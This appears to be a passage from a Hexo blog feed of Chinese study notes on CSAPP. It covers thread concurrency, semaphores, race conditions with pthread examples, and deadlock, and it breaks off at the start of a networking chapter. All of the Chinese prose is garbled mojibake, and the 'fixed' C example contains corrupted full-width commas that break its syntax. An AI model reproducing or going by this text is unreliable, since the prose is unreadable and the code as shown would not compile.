ˆè¯´æ˜¯ç‹¬ç«‹çš„ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ˜¯å…±äº«çš„ï¼Œåªè¦çŸ¥é“å†…å­˜åœ°å€ï¼Œä¾¿å¯ä»¥è½»æ¾è®¿é—®å…¶å®ƒçº¿ç¨‹çš„æ ˆï¼Œ</p><h3 id="å°†å˜é‡æ˜ å°„åˆ°å†…å­˜"><a href="#å°†å˜é‡æ˜ å°„åˆ°å†…å­˜" class="headerlink" title="å°†å˜é‡æ˜ å°„åˆ°å†…å­˜"></a>å°†å˜é‡æ˜ å°„åˆ°å†…å­˜</h3><p>å¤šçº¿ç¨‹ä¸­çš„C ç¨‹åºçš„å˜é‡æ ¹æ®å®ƒä»¬çš„å­˜å‚¨ç±»å‹è¢«æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ï¼š</p><ul><li>å…¨å±€å˜é‡ï¼Œåœ¨ bss æˆ–è€… data æ®µä¸Šã€‚</li><li>æœ¬åœ°å˜é‡ï¼Œåœ¨æ ˆæˆ–è€…æ˜¯å¯„å­˜å™¨ä¸Šã€‚</li><li>æœ¬åœ°é™æ€å˜é‡ï¼Œåœ¨ bss æˆ–è€… data æ®µä¸Šã€‚</li></ul><h4 id="å…±äº«å˜é‡"><a href="#å…±äº«å˜é‡" class="headerlink" title="å…±äº«å˜é‡"></a>å…±äº«å˜é‡</h4><p>æˆ‘ä»¬è¯´ä¸€ä¸ªå˜é‡ â€œæ˜¯å…±äº«çš„ï¼Œå½“ä¸”ä»…å½“å®ƒçš„<strong>ä¸€ä¸ªå®ä¾‹è¢«ä¸€ä¸ªä»¥ä¸Šçš„çº¿ç¨‹å¼•ç”¨ã€‚</strong></p><h1 id="ç”¨ä¿¡å·é‡åŒæ­¥çº¿ç¨‹"><a href="#ç”¨ä¿¡å·é‡åŒæ­¥çº¿ç¨‹" class="headerlink" title="ç”¨ä¿¡å·é‡åŒæ­¥çº¿ç¨‹"></a>ç”¨ä¿¡å·é‡åŒæ­¥çº¿ç¨‹</h1><p>å…±äº«å˜é‡å¼•å…¥äº†åŒæ­¥é”™è¯¯çš„å¯èƒ½æ€§ã€‚</p><p>ä¾‹å¦‚ï¼Œå¤šçº¿ç¨‹æ‰§è¡Œ <code>cnt++</code> ï¼Œæˆ‘ä»¬é¢„æµ‹æœ€ç»ˆçš„ç»“æœæ˜¯æ¯ä¸ªçº¿ç¨‹åšåŠ æ³•çš„å’Œï¼Œä½†å®é™…ä¸Šå¹¶ä¸æ˜¯ç›¸åŠ çš„æ¬¡æ•°ã€‚</p><p>æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹æ‰§è¡Œè®¡æ•°çš„è¿™ä¸€å¥ä»£ç ï¼Œå®ƒåœ¨æ±‡ç¼–å±‚é¢è¢«åˆ†æˆäº†ä¸‰æ­¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq cnt(%rip),%rdx<br>addq$1,%rdx<br>movq%rdx,cnt(%rip)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¤šçº¿ç¨‹åŒæ—¶è¿è¡Œæ—¶ï¼Œå¹¶ä¸èƒ½ä¿è¯è¿™ä¸ª <code>cnt++</code> ä»£ç å®Œæ•´çš„æ‰§è¡Œå®Œä»¥åæ‰è½¬æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ã€‚å¯èƒ½å‘ç”Ÿè¿™ç§æƒ…å†µï¼šçº¿ç¨‹ 1 ä»å†…å­˜ä¸­å–å€¼ï¼Œæ­£åœ¨è¿›è¡Œ add æ“ä½œï¼Œä½†å¹¶æ²¡æœ‰è¿”å›å†…å­˜ã€‚è¿™æ—¶çº¿ç¨‹ 2 ä»å†…å­˜ä¸­å–å€¼ï¼Œå–åˆ°çš„å€¼è¿˜æ˜¯çº¿ç¨‹ 1 æ²¡æœ‰å¤„ç†è¿‡çš„å€¼ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªçº¿ç¨‹åˆ†åˆ«è¿›è¡ŒåŠ ä¸€çš„æ“ä½œå¹¶å­˜å‚¨å›å†…å­˜ï¼Œå¾—åˆ°çš„ç»“æœåªæ˜¯åŠ äº†ä¸€æ¬¡ï¼Œå°±å‡ºç°äº†é”™è¯¯ã€‚</p><h3 id="ä¿¡å·é‡"><a href="#ä¿¡å·é‡" class="headerlink" title="ä¿¡å·é‡"></a>ä¿¡å·é‡</h3><p><strong>ä¿¡å·é‡ s æ˜¯å…·æœ‰éè´Ÿæ•´æ•°å€¼çš„å…¨å±€å˜é‡</strong>ï¼Œåªèƒ½ç”±ä¸¤ç§ç‰¹æ®Šçš„æ“ä½œæ¥å¤„ç†ï¼Œè¿™ä¸¤ç§æ“ä½œç§°ä¸º På’ŒVï¼š</p><ul><li>P(s)ï¼šå¦‚æœ s æ˜¯éé›¶çš„ï¼Œé‚£ä¹ˆ P å°†å‡ 1ï¼Œå¹¶ä¸”ç«‹å³è¿”å›ã€‚å¦‚æœä¸ºé›¶ï¼Œé‚£ä¹ˆå°±æŒ‚èµ·è¿™ä¸ªçº¿ç¨‹ï¼Œç›´åˆ° s å˜ä¸ºéé›¶ï¼Œè€Œä¸€ä¸ªV æ“ä½œä¼šé‡å¯è¿™ä¸ªçº¿ã€‚åœ¨é‡å¯ä¹‹åï¼ŒP æ“ä½œå°† s å‡ 1ï¼Œå¹¶å°†æ§åˆ¶è¿”å›ç»™è°ƒç”¨è€…ã€‚</li><li>V(s):ï¼šV æ“ä½œå°† s åŠ  1ã€‚å¦‚æœæœ‰ä»»ä½•çº¿ç¨‹é˜»å¡åœ¨ P æ“ä½œç­‰å¾…å˜æˆéé›¶ï¼Œé‚£ä¹ˆ V æ“ä½œä¼šé‡å¯è¿™äº›çº¿ç¨‹ä¸­çš„ä¸€ä¸ªï¼Œç„¶åè¯¥çº¿ç¨‹å°† s å‡ 1ï¼Œå®Œæˆå®ƒçš„ P æ“ä½œã€‚</li></ul><h3 id="ä½¿ç”¨ä¿¡å·é‡æ¥å®ç°äº’æ–¥"><a href="#ä½¿ç”¨ä¿¡å·é‡æ¥å®ç°äº’æ–¥" class="headerlink" title="ä½¿ç”¨ä¿¡å·é‡æ¥å®ç°äº’æ–¥"></a>ä½¿ç”¨ä¿¡å·é‡æ¥å®ç°äº’æ–¥</h3><p>å°†æ¯ä¸ªå…±äº«å˜é‡ï¼ˆæˆ–è€…ä¸€ç»„ç›¸å…³çš„å…±äº«å˜é‡ï¼‰ä¸ä¸€ä¸ªä¿¡å·é‡ sï¼ˆåˆå§‹ä¸º 1ï¼‰è”ç³»èµ·æ¥ï¼Œç„¶åç”¨ <code>P(s)</code> å’Œ <code>V(s)</code> æ“ä½œå°†ç›¸åº”çš„ä¸´ç•ŒåŒºåŒ…å›´èµ·æ¥ã€‚ä»¥è¿™ç§æ–¹å¼æ¥ä¿æŠ¤å…±äº«å˜é‡çš„ä¿¡å·é‡å«åšäºŒå…ƒä¿¡å·é‡ï¼ˆbinary semaphoreï¼‰ï¼Œå› ä¸ºå®ƒçš„å€¼æ€»æ˜¯ 0 æˆ–è€… 1ã€‚</p><p>ä»¥æä¾›äº’æ–¥ä¸ºç›®çš„çš„äºŒå…ƒä¿¡å·é‡å¸¸å¸¸ä¹Ÿç§°ä¸ºäº’æ–¥é”ï¼ˆmutexï¼‰ã€‚åœ¨ä¸€ä¸ªäº’æ–¥é”ä¸Šæ‰§è¡Œ P æ“ä½œç§°ä¸º<strong>å¯¹äº’æ–¥é”åŠ é”</strong>ã€‚ç±»ä¼¼åœ°ï¼Œæ‰§è¡Œ V æ“ä½œç§°ä¸º<strong>å¯¹äº’æ–¥é”è§£é”</strong>ã€‚å¯¹ä¸€ä¸ªäº’æ–¥é”åŠ äº†é”ä½†æ˜¯è¿˜æ²¡æœ‰è§£é”çš„çº¿ç¨‹ç§°ä¸º<strong>å ç”¨è¿™ä¸ªäº’æ–¥é”</strong>ã€‚</p><h3 id="ä½¿ç”¨ä¿¡å·é‡æ¥è°ƒåº¦å…±äº«èµ„æº"><a href="#ä½¿ç”¨ä¿¡å·é‡æ¥è°ƒåº¦å…±äº«èµ„æº" class="headerlink" title="ä½¿ç”¨ä¿¡å·é‡æ¥è°ƒåº¦å…±äº«èµ„æº"></a>ä½¿ç”¨ä¿¡å·é‡æ¥è°ƒåº¦å…±äº«èµ„æº</h3><blockquote><p>å®ç°æˆ‘çœŸçš„çœ‹ä¸æ‡‚æˆ‘å°±å†™å†™é—®é¢˜åŸç†å•¥çš„å‰©ä¸‹çš„å†è¡¥ï¼Œä¹Ÿå¯èƒ½ä¸ä¼šè¡¥(x</p></blockquote><p>ä¿¡å·é‡è°ƒåº¦å¯¹å…±äº«èµ„æºçš„è®¿é—®ã€‚åœ¨è¿™ç§åœºæ™¯ä¸­ï¼Œä¸€ä¸ªçº¿ç¨‹ç”¨ä¿¡å·é‡æ“ä½œæ¥é€šçŸ¥å¦ä¸€ä¸ªçº¿ç¨‹ï¼Œç¨‹åºçŠ¶æ€ä¸­çš„æŸä¸ªæ¡ä»¶å·²ç»ä¸ºçœŸäº†ã€‚</p><p>ä¸¤ä¸ªç»å…¸çš„ä¾‹å­æ˜¯ç”Ÿäº§è€…-æ¶ˆè´¹è€…å’Œè¯»è€…-å†™è€…é—®é¢˜ã€‚</p><h4 id="ç”Ÿäº§è€…-æ¶ˆè´¹è€…"><a href="#ç”Ÿäº§è€…-æ¶ˆè´¹è€…" class="headerlink" title="ç”Ÿäº§è€…-æ¶ˆè´¹è€…"></a>ç”Ÿäº§è€…-æ¶ˆè´¹è€…</h4><p>è¿™ä¸ªä¾‹å­æ˜¯å¾ˆå½¢è±¡çš„ï¼Œç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çº¿ç¨‹å…±äº«ä¸€ä¸ªæœ‰ n ä¸ªæ§½çš„æœ‰é™ç¼“å†²åŒºã€‚ç”Ÿäº§è€…çº¿ç¨‹åå¤åœ°ç”Ÿæˆæ–°çš„é¡¹ç›®ï¼Œå¹¶æŠŠå®ƒä»¬æ’å…¥åˆ°ç¼“å†²åŒºä¸­ã€‚æ¶ˆè´¹è€…çº¿ç¨‹ä¸æ–­åœ°ä»ç¼“å†²åŒºä¸­å–å‡ºè¿™äº›é¡¹ç›®ï¼Œç„¶åæ¶ˆè´¹(ä½¿ç”¨)å®ƒä»¬ã€‚</p><p>æˆ‘ä»¬å¿…é¡»ä¿è¯å¯¹ç¼“å†²åŒºçš„è®¿é—®æ˜¯äº’æ–¥çš„ï¼Œè¿˜éœ€è¦è°ƒåº¦å¯¹ç¼“å†²åŒºçš„è®¿é—®ã€‚å¦‚æœç¼“å†²åŒºæ˜¯æ»¡çš„ï¼Œé‚£ä¹ˆç”Ÿäº§è€…å¿…é¡»ç­‰å¾…ç›´åˆ°æœ‰ä¸€ä¸ªæ§½ä½å˜ä¸ºå¯ç”¨ã€‚ä¸ä¹‹ç›¸ä¼¼ï¼Œå¦‚æœç¼“å†²åŒºæ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆæ¶ˆè´¹è€…å¿…é¡»ç­‰å¾…ç›´åˆ°æœ‰ä¸€ä¸ªé¡¹ç›®å˜ä¸ºå¯ç”¨ã€‚</p><p>ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å…±ç”¨ä¸€ä¸ªä¿¡å·é‡ï¼ŒåŒæ—¶ä¹Ÿå…±ç”¨é”ã€‚</p><h4 id="è¯»è€…-å†™è€…"><a href="#è¯»è€…-å†™è€…" class="headerlink" title="è¯»è€…-å†™è€…"></a>è¯»è€…-å†™è€…</h4><p>ä¿®æ”¹å¯¹è±¡çš„çº¿ç¨‹å«åšå†™è€…ã€‚åªè¯»å¯¹è±¡çš„çº¿ç¨‹å«åšè¯»è€…ã€‚å†™è€…å¿…é¡»æ‹¥æœ‰å¯¹å¯¹è±¡çš„ç‹¬å çš„è®¿é—®ï¼Œè€Œè¯»è€…å¯ä»¥å’Œæ— é™å¤šä¸ªå…¶ä»–çš„è¯»è€…å…±äº«å¯¹è±¡ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰æ— é™å¤šä¸ªå¹¶å‘çš„è¯»è€…å’Œå†™è€…ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬æŠ¢æ¼”å”±ä¼šé—¨ç¥¨ï¼Œæˆ‘å’Œå¦ä¸€ä¸ªäººé€‰äº†åŒä¸€ä¸ªåº§ä½ï¼Œç‚¹è¿›å»çš„æ—¶å€™æ˜¾ç¤ºæ˜¯æœ‰ç¥¨ï¼ˆè¯»æ•°æ®åº“ï¼‰ã€‚è¿™æ—¶æˆ‘ç»“ç®—è®¢å•æ¯”å¥¹å¿«ï¼ˆå†™æ•°æ®åº“ï¼‰ï¼Œå¥¹ä»˜æ¬¾çš„æ—¶å€™å°±ä¼šæ˜¾ç¤ºæ²¡ç¥¨ã€‚</p><p>è¿™ä¸ªé—®é¢˜åˆ†è¯»è€…æœ‰é™å’Œå†™è€…ä¼˜å…ˆä¸¤ç§æ–¹æ¡ˆã€‚</p><h1 id="å…¶ä»–å¹¶å‘é—®é¢˜"><a href="#å…¶ä»–å¹¶å‘é—®é¢˜" class="headerlink" title="å…¶ä»–å¹¶å‘é—®é¢˜"></a>å…¶ä»–å¹¶å‘é—®é¢˜</h1><h3 id="çº¿ç¨‹å®‰å…¨"><a href="#çº¿ç¨‹å®‰å…¨" class="headerlink" title="çº¿ç¨‹å®‰å…¨"></a>çº¿ç¨‹å®‰å…¨</h3><p>ä¸€ä¸ªå‡½æ•°è¢«ç§°ä¸ºçº¿ç¨‹å®‰å…¨çš„ï¼Œå½“ä¸”ä»…å½“<strong>è¢«å¤šä¸ªå¹¶å‘çº¿ç¨‹åå¤åœ°è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä¸€ç›´äº§ç”Ÿæ­£ç¡®çš„ç»“æœ</strong>ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæˆ‘ä»¬å°±è¯´å®ƒæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ã€‚</p><p>ä»¥ä¸‹å››ç§å‡½æ•°è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼š</p><ul><li>ä¸ä¿æŠ¤å…±äº«å˜é‡çš„å‡½æ•°</li><li>ä¿æŒè·¨è¶Šå¤šä¸ªè°ƒç”¨çŠ¶æ€çš„å‡½æ•°</li><li>è¿”å›æŒ‡å‘é™æ€å˜é‡çš„æŒ‡é’ˆçš„å‡½æ•°</li><li>è°ƒç”¨çº¿ç¨‹ä¸å®‰å…¨å‡½æ•°çš„å‡½æ•°</li></ul><p>å¤„ç†çº¿ç¨‹ä¸å®‰å…¨å‡½æ•°æœ‰ä¸¤ç§æ–¹æ³•ï¼š1ï¼‰é‡å†™å‡½æ•° ï¼Œ2ï¼‰ä½¿ç”¨åŠ é” - å¤åˆ¶æŠ€æœ¯</p><h3 id="ç«äº‰å’Œæ­»é”"><a href="#ç«äº‰å’Œæ­»é”" class="headerlink" title="ç«äº‰å’Œæ­»é”"></a>ç«äº‰å’Œæ­»é”</h3><h4 id="ç«äº‰"><a href="#ç«äº‰" class="headerlink" title="ç«äº‰"></a>ç«äº‰</h4><p><strong>å½“ä¸€ä¸ªç¨‹åºçš„æ­£ç¡®æ€§ä¾èµ–äºä¸€ä¸ªçº¿ç¨‹ a è¦åœ¨å¦ä¸€ä¸ªçº¿ç¨‹ b åˆ°è¾¾ $$y_b$$ç‚¹ä¹‹å‰åˆ°è¾¾å®ƒçš„æ§åˆ¶æµä¸­çš„ $$z_x$$ ç‚¹æ—¶ï¼Œå°±ä¼šå‘ç”Ÿç«äº‰ï¼ˆraceï¼‰</strong>ã€‚é€šå¸¸å‘ç”Ÿç«äº‰æ˜¯å› ä¸ºç¨‹åºå‘˜å‡å®šçº¿ç¨‹å°†æŒ‰ç…§æŸç§ç‰¹æ®Šçš„è½¨è¿¹çº¿ç©¿è¿‡æ‰§è¡ŒçŠ¶æ€ç©ºé—´ï¼Œè€Œå¿˜è®°äº†å¦ä¸€æ¡å‡†åˆ™è§„å®šï¼šå¤šçº¿ç¨‹çš„ç¨‹åºå¿…é¡»å¯¹ä»»ä½•å¯è¡Œçš„è½¨è¿¹çº¿éƒ½æ­£ç¡®å·¥ä½œã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„å®ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 4</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    <span class="hljs-type">int</span> myid=*((<span class="hljs-type">int</span> *)vargp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from thread %d\n&quot;</span>,myid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pthread_t</span> tid[N];<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123; <br>        pthread_create(&amp;tid[i], <span class="hljs-literal">NULL</span>, thread, &amp;i);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        pthread_join(tid[i], <span class="hljs-literal">NULL</span>); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç†æƒ³çš„çŠ¶æ€æ˜¯ä¾æ¬¡è¾“å‡º ID 0ï¼Œ1ï¼Œ2ï¼Œ3ã€‚ä½†å®é™…ä¸Šçš„è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-race.png"></p><p>è¿™å°±æ˜¯ç”±æ¯ä¸ªå¯¹ç­‰çº¿ç¨‹å’Œä¸»çº¿ç¨‹ä¹‹é—´çš„ç«äº‰å¼•èµ·çš„ã€‚</p><p>ä»£ç ä¸­çš„ä¸¤ä¸ª for å¾ªç¯ä¸­ï¼Œç¬¬ä¸€ä¸ª for å¾ªç¯ä¼ é€’äº†ä¸€ä¸ªæŒ‡å‘æœ¬åœ°æ ˆå˜é‡çš„æŒ‡é’ˆã€‚åœ¨ä¸‹ä¸€æ¬¡ for å¾ªç¯å¯¹ i åŠ 1å’Œ<code>*thread</code> å‚æ•°çš„é—´æ¥å¼•ç”¨å’Œèµ‹å€¼ä¹‹é—´å°±å‘ç”Ÿäº†ç«äº‰ã€‚å¦‚æœå¯¹ç­‰çº¿ç¨‹åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œå¯¹åŠ 1ä¹‹å‰å°±æ‰§è¡Œäº† <code>*thread</code> ï¼Œé‚£ä¹ˆ myid å˜é‡å°±å¾—åˆ°æ­£ç¡®çš„ IDã€‚å¦åˆ™ï¼Œå®ƒåŒ…å«çš„å°±ä¼šæ˜¯å…¶ä»–çº¿ç¨‹çš„ IDã€‚</p><p>è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¸ºæ¯ä¸ªæ•´æ•° ID åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„å¿«ï¼Œå¹¶ä¼ é€’ç»™çº¿ç§Ÿä¾‹ç¨‹ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå—çš„æŒ‡é’ˆã€‚å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 4</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    <span class="hljs-type">int</span> myid = *((<span class="hljs-type">int</span> *)vargp);<br>    <span class="hljs-built_in">free</span>(vargp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from thread %d\n&quot;</span>ï¼Œmyid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pthread_t</span> tid[N];<br>    <span class="hljs-type">int</span> i,*ptr;<br>    <br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i&lt;N;i++) <br>    &#123;<br>        ptr = Malloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        *ptr = i;<br>        pthread_create(&amp;tid[i],<span class="hljs-literal">NULL</span>ï¼Œthread,ptr);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        pthread_join(tid[i]ï¼Œ<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h4><p>æ­»é”å°±æ˜¯æŒ‡ä¸€ç»„çº¿ç¨‹è¢«é˜»å¡äº†ï¼Œç­‰å¾…ä¸€ä¸ªæ°¸è¿œä¹Ÿä¸ä¼šä¸ºçœŸçš„æ¡ä»¶ã€‚</p><p>æ¯”è¾ƒç³Ÿç³•çš„æ˜¯ï¼Œæ­»é”é”™è¯¯ä¸å¯é¢„æµ‹ï¼Œä¸”é”™è¯¯ä¸å¯é‡è¯»ï¼Œå› ä¸ºæ¯ä¸€ä¸åŒçš„æ‰§è¡Œéƒ½æœ‰ä¸åŒçš„è½¨è¿¹çº¿ã€‚å¾ˆæœ‰å¯èƒ½æˆ‘ä»¬æ‰§è¡Œå¾ˆå¤šæ¬¡æµ‹è¯•éƒ½æ²¡æœ‰å‡ºç°é—®é¢˜ï¼Œæœ€åäº¤ç»™ä¸Šé¢é¢†å¯¼è¿è¡Œä¸€ä¸‹å°±æ­»é”äº†ã€‚</p><p>å½“ä½¿ç”¨äºŒå…ƒä¿¡å·é‡æ¥å®ç°äº’æ–¥æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åº”ç”¨äº’æ–¥é”åŠ é”é¡ºåºè§„åˆ™æ¥é¿å…æ­»é”ã€‚</p><p>äº’æ–¥é”åŠ é”é¡ºåºè§„åˆ™ï¼š ç»™å®šæ‰€æœ‰äº’æ–¥æ“ä½œçš„ä¸€ä¸ªå…¨åºï¼Œå¦‚æœæ¯ä¸ªçº¿ç¨‹éƒ½æ˜¯ä»¥ä¸€ç§é¡ºåºè·å¾—äº’æ–¥é”å¹¶ä»¥ç›¸åçš„é¡ºåºé‡Šæ”¾ï¼Œé‚£ä¹ˆè¿™ä¸ªç¨‹åºå°±æ˜¯æ— æ­»é”çš„ã€‚</p><hr><p>å¤§æ¿ç – overover !!</p><p>æ˜å¤©å»æ­ç”µåƒé¥­ï¼</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
      <tag>å¹¶å‘ç¼–ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬åä¸€ç«  ç½‘ç»œç¼–ç¨‹</title>
    <link href="/2023/12/25/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/12/25/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å°±æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</p><span id="more"></span><h1 id="å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¼–ç¨‹æ¨¡å‹"><a href="#å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¼–ç¨‹æ¨¡å‹" class="headerlink" title="å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¼–ç¨‹æ¨¡å‹"></a>å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¼–ç¨‹æ¨¡å‹</h1><p>æ¯ä¸ªç½‘ç»œåº”ç”¨éƒ½æ˜¯åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹çš„ã€‚é‡‡ç”¨è¿™ä¸ªæ¨¡å‹ï¼Œä¸€ä¸ªåº”ç”¨æ˜¯ç”±ä¸€ä¸ªæœåŠ¡å™¨è¿›ç¨‹å’Œä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¢æˆ·ç«¯ç»„æˆçš„ã€‚å…¶ä¸­ï¼ŒæœåŠ¡å™¨ç®¡ç†äº†å„ç§èµ„æºï¼Œå¹¶ä¸”é€šè¿‡æ“ä½œè¿™ç§èµ„æºä¸ºä»–ä»¬çš„å®¢æˆ·ç«¯æä¾›æŸç§æœåŠ¡ã€‚</p><p><strong>å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ä¸­çš„åŸºæœ¬æ“ä½œæ˜¯äº‹åŠ¡ï¼ˆtransactionï¼‰</strong>ã€‚ä¸€ä¸ªå®¢æˆ·ç«¯-æœåŠ¡å™¨äº‹åŠ¡ç”±ä¸€ä¸‹å››æ­¥ç»„æˆï¼š</p><ul><li>å½“ä¸€ä¸ªå®¢æˆ·ç«¯éœ€è¦æœåŠ¡æ—¶ï¼Œä»–ä¼šå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå‘èµ·ä¸€ä¸ªäº‹åŠ¡ã€‚</li><li>æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè§£é‡Šå®ƒï¼Œå¹¶ä»¥é€‚å½“çš„æ–¹å¼æ“ä½œå®ƒçš„èµ„æº</li><li>æœåŠ¡å™¨ç»™å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªå“åº”ï¼Œå¹¶ç­‰å¾…ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</li><li>å®¢æˆ·ç«¯æ”¶åˆ°å“åº”å¹¶å¤„ç†å®ƒ</li></ul><p><img 